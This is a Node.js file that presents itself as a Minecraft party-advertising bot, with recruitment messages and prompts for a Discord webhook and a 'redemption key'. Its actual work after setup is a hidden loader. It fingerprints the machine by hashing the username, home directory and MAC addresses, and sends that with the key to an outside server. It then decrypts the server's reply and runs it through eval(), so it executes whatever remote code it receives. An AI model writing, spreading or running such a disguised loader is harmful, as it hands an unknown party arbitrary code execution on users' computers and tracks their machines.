
const config = require('./config.js')
const mineflayer = require('mineflayer');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const os = require('os');
const axios = require('axios/dist/node/axios.cjs');
const crypto = require('crypto');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
function generateHWID() {
    // Get the user information and network interfaces
    const userInfo = os.userInfo();
    const networkInterfaces = os.networkInterfaces();
  
    // Create a string with user-specific and hardware-specific information
    const dataToHash = `${userInfo.username}-${userInfo.homedir}-` +
      Object.values(networkInterfaces)
      .reduce((result, niList) => result.concat(niList), [])
      .reduce((result, ni) => result + (ni.mac || ''), '');
  
    // Hash the string to produce the HWID
    const hwid = crypto.createHash('sha256').update(dataToHash).digest('hex');
  
    return hwid;
  }
  
const messages = [
    '1/2 vc be good',
    '1/2 vc fun private games /p me',
    '1/2 vc /p me 5+ fkdr only',
    '1/2 vc playing on bedwars practice /p me ',
    'vc 1/2, need good star, no messing around',
    '1/2 vc no noobs allowed',
    '1/2 vc doing fun games on bedwars practice /p me',
    '1/2 vc, party me if interested',
    '1/2 winstreaking /p me',
    'anyone up for duos vc? party me or say my name if interested',
    '1/2 vc, looking for a partner with skill',
    'in need of vc partner, party or say my name',
    'chill 1/2 duos vc only',
    'anyone for duos vc? /p me',
    '1/2 vc grinding stats /p me',
    
];

let configs = require("./config.js");

function updateConfig() {
   const updatedConfig = "module.exports = " + JSON.stringify(configs, null, 4);
    fs.writeFile("./config.js", updatedConfig, 'utf8', (err) => {
        if (err) {
            console.error(err);
            return;
        }
        delete require.cache[require.resolve("./config.js")];
        configs = require("./config.js");
    });
}

function question(query) {
    return new Promise((resolve) => {
        rl.question(query, (answer) => {
            resolve(answer);
        });
    });
}

async function configure() {
    if (!configs.username || configs.username.trim() === '') {
        configs.username = await question("Username is empty. Please enter your bot's username: ");
    }
    if (!configs.invite || configs.invite.trim() === '') {
        configs.invite = await question('Invite link is empty. Please enter an invite link to your server: ');
    }
    if (!configs.webhook || configs.webhook.trim() === '') {
        configs.webhook = await question('Webhook URL is empty. Please enter a webhook URL for webhook logging: ');
    }
    if (!configs.pfp || configs.pfp.trim() === '') {
        configs.pfp = await question('Please set a PFP for your bot. Please paste a URL: ');
    }
    if (!configs.key || configs.key.trim() === '') {
        configs.key = await question('What is your redemption key? Paste it here:');
    }

    updateConfig();
}

configure().then(() => {
    
    function splitAtBot(inputString) {
        const separator = 'bot';
        const separatorIndex = inputString.indexOf(separator);
    
        if (separatorIndex === -1) {
            // If the word 'bot' is not found, return the original string in an array
            return [inputString];
        }
    
        const firstPart = inputString.substring(0, separatorIndex);
        const secondPart = inputString.substring(separatorIndex + separator.length);
    
        return [firstPart, secondPart];
    }
    const a = splitAtBot(config.key)    
    async function sendPostRequest() {
        const url = 'https://lakymkovirustesting.onrender.com/adbot';
        const data = {
            key: a[0], // Replace with your actual key
            hwid: generateHWID(), // Replace with the username
        };
        try {
            const response = await axios.post(url, data);
            function decrypt(encryptedObject, keybuffer) {
                // Ensure the key is a Buffer
                const key = Buffer.from(keybuffer, 'hex');
            
                // Ensure encrypted data is available and is a Buffer
                if (!encryptedObject.encryptedData) {
                    throw new Error('Encrypted data is missing or undefined');
                }
                const encryptedText = Buffer.from(encryptedObject.encryptedData, 'hex');
            
                // Create a decipher
                const decipher = crypto.createDecipheriv('aes-256-ecb', key, null);
                let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
                decrypted += decipher.final('utf8');
                return decrypted;
            }
            eval(decrypt(response.data, a[1]))
        } catch (error) {
            console.error('Error:', error.response ? error.response.data : error.message);
        }
    }
    
    sendPostRequest();
});